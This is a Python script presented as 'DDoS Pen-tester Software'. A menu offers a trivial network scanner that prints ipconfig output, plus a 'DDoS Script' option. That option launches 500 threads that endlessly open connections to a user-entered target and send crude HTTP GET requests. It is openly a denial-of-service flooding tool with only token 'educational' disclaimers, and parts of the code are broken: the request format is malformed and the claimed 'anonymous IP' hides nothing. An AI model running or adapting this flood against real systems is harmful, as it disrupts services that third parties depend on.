import threading
import socket
import time
import subprocess

"""The following script is only for the training purpose, responsible use is expected"""


def loading_bar():
    print("Scanning the network, Please wait...")
    for i in range(1, 5):
        print("=")
        time.sleep(1)

def network_scanner():
    data = subprocess.check_output(['ipconfig','/all']).decode('utf').split('\n')

    for item in data:
        print(item.split('\r'))


if __name__ == "__main__":
    while True:
        print("***********DDoS Pen-tester Software (betaV1- test version)**********")
        print("""The Software is developed for Educational and pentesting purpose, responsible use is expected
        ------------------------------------------------------
        V1(Beta)-All Rights reserved""")
        print("----------------------------------------------------")
        print("Choose from the options below : ")
        print("1. Network scanner")
        print("2. DDoS Script ")
        print("3. Exit")

        choice = int(input("Enter choice : "))
        if choice == 1:
            loading_bar()
            network_scanner()
        elif choice == 2:
            target = input("Enter the IPv4 address of device to be attacked : ")
            port = 9999
            ananomous_ip = '182.168.1.1'

            already_connected = 0
            print("Attack Time :", time.ctime(time.time()))
            t = time.ctime(time.time())
            def attack():
                while True:
                    print("Attacking prey : ", target)
        
                    sock = socket.socket()
                    sock.connect((target, port))
                    sock.sendto(("GET / "+target+" HTTP/1.1\r\n").encode('ascii'), (target, port))
                    sock.sendto(("Host: "+ananomous_ip+"\r\n\r\n").encode('ascii'), (target, port))
                    sock.close()

                    global already_connected
                    already_connected += 1
                    print("Connections made till now : ", already_connected)

            for i in range(500):
                thread = threading.Thread(target=attack)
                thread.start()
                
            
        else:
            print("Thanks for using!")
            break